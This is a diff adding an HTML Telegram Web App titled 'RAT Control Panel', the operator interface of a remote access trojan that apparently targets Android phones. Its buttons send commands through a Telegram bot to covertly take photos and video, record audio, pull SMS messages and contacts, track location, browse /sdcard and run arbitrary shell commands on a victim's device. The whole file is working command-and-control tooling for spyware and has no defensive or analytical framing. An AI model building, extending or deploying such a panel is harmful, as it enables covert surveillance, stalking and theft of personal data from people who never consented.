@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT Control Panel</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            background: linear-gradient(135deg, #1e1e1e, #2d2d2d);
+            color: white; 
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 400px; margin: 0 auto; }
+        .header { 
+            text-align: center; 
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+        .status { 
+            background: #4CAF50; 
+            padding: 10px; 
+            border-radius: 10px; 
+            text-align: center;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .panel { 
+            background: rgba(255,255,255,0.1);
+            padding: 15px; 
+            margin: 10px 0; 
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .btn { 
+            background: #4CAF50; 
+            border: none; 
+            color: white; 
+            padding: 12px; 
+            margin: 5px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: calc(100% - 10px);
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        .btn:hover { background: #45a049; transform: translateY(-2px); }
+        .btn-danger { background: #f44336; }
+        .btn-warning { background: #ff9800; }
+        .btn-secondary { background: #2196F3; }
+        .section-title { 
+            margin: 15px 0 10px 0; 
+            color: #4CAF50;
+            font-size: 16px;
+        }
+        .log { 
+            background: rgba(0,0,0,0.3); 
+            padding: 10px; 
+            border-radius: 8px; 
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .input-group { margin: 10px 0; }
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: #333;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🤖 RAT Control</h1>
+            <p>Web App - Connected to Telegram Bot</p>
+        </div>
+        
+        <div class="status" id="connectionStatus">🟢 Connected to Bot</div>
+        
+        <div class="panel">
+            <div class="section-title">📸 Camera Control</div>
+            <div class="input-group">
+                <select id="cameraSelect">
+                    <option value="front">Front Camera</option>
+                    <option value="rear">Rear Camera</option>
+                </select>
+            </div>
+            <button class="btn" onclick="captureCamera()">📸 Capture Photo</button>
+            <button class="btn" onclick="recordVideo()">🎥 Record Video (10s)</button>
+        </div>
+
+        <div class="panel">
+            <div class="section-title">🎤 Audio Control</div>
+            <div class="input-group">
+                <select id="audioDuration">
+                    <option value="10">10 seconds</option>
+                    <option value="30">30 seconds</option>
+                    <option value="60">60 seconds</option>
+                </select>
+            </div>
+            <button class="btn" onclick="recordAudio()">🎤 Record Audio</button>
+        </div>
+
+        <div class="panel">
+            <div class="section-title">📊 Data Extraction</div>
+            <button class="btn" onclick="extractSMS()">📱 Extract SMS</button>
+            <button class="btn" onclick="extractContacts()">👥 Extract Contacts</button>
+            <button class="btn" onclick="getLocation()">📍 Get Location</button>
+            <button class="btn" onclick="browseFiles()">📁 Browse Files</button>
+        </div>
+
+        <div class="panel">
+            <div class="section-title">💻 Shell Commands</div>
+            <div class="input-group">
+                <input type="text" id="shellCommand" placeholder="Enter shell command..." value="ls -la">
+            </div>
+            <button class="btn btn-warning" onclick="executeShell()">⚡ Execute Command</button>
+        </div>
+
+        <div class="panel">
+            <div class="section-title">📋 Command Log</div>
+            <div class="log" id="commandLog">
+                > WebApp initialized<br>
+                > Ready to send commands to bot<br>
+                > Use buttons above to control device
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Инициализация Telegram Web App
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.MainButton.setText("CONNECTED").show();
+        
+        function sendCommand(command, parameters = {}) {
+            const log = document.getElementById('commandLog');
+            log.innerHTML += `> Sending: ${command}<br>`;
+            log.scrollTop = log.scrollHeight;
+            
+            // Отправка данных в Telegram бот
+            const data = {
+                command: command,
+                parameters: parameters,
+                timestamp: new Date().toISOString()
+            };
+            
+            tg.sendData(JSON.stringify(data));
+            
+            log.innerHTML += `<span style="color: #4CAF50">> Command sent to bot</span><br>`;
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function captureCamera() {
+            const cameraType = document.getElementById('cameraSelect').value;
+            sendCommand('camera_capture', { camera: cameraType });
+        }
+        
+        function recordVideo() {
+            sendCommand('record_video', { duration: 10 });
+        }
+        
+        function recordAudio() {
+            const duration = document.getElementById('audioDuration').value;
+            sendCommand('record_audio', { duration: parseInt(duration) });
+        }
+        
+        function extractSMS() {
+            sendCommand('get_sms');
+        }
+        
+        function extractContacts() {
+            sendCommand('get_contacts');
+        }
+        
+        function getLocation() {
+            sendCommand('get_location');
+        }
+        
+        function browseFiles() {
+            sendCommand('browse_files', { path: '/sdcard' });
+        }
+        
+        function executeShell() {
+            const command = document.getElementById('shellCommand').value;
+            if (command.trim()) {
+                sendCommand('execute_shell', { command: command });
+            }
+        }
+        
+        // Авто-скролл лога
+        const log = document.getElementById('commandLog');
+        log.scrollTop = log.scrollHeight;
+    </script>
+</body>
+</html>
